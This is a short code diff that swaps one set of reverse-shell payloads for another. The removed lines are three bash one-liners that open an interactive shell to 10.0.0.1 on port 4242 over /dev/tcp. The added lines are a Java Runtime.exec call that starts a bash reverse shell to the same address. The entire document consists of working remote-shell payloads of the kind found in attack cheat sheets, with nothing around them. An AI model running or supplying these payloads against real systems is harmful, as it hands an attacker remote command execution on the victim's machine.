@@ -1,7 +1,3 @@
-#!/bin/bash
-
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
-
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
-
-/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+p.waitFor();
